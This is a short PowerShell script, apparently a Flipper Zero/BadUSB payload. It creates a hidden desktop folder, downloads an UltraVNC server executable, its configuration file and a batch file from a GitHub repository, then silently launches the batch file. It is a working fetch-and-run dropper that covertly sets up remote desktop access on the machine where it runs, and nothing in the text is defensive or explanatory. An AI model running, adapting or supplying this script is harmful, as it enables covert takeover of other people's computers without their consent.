Start-Sleep -Seconds 4

# Define the folder path on the desktop
$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'inentor')

# Create the folder
New-Item -ItemType Directory -Path $desktopPath -Force
Start-Sleep -Seconds 4
Set-ItemProperty -Path $desktopPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
Start-Sleep -Seconds 4

# Define URLs for the files to download
$url1 = "https://github.com/TriPaGonski/VNCFLIPPERZERO/raw/main/winvnc.exe"
$url2 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/ultravnc.ini"
$url3 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/Main.bat"

# Define the local file paths
$filePath1 = "$desktopPath\winvnc.exe"
$filePath2 = "$desktopPath\ultravnc.ini"
$filePath3 = "$desktopPath\main.bat"

# Download the files
Invoke-WebRequest -Uri $url1 -OutFile $filePath1
Start-Sleep -Seconds 4
Invoke-WebRequest -Uri $url2 -OutFile $filePath2
Start-Sleep -Seconds 4
Invoke-WebRequest -Uri $url3 -OutFile $filePath3
Start-Sleep -Seconds 4

# Execute the main.bat file
Start-Process -FilePath $filePath3 -NoNewWindow
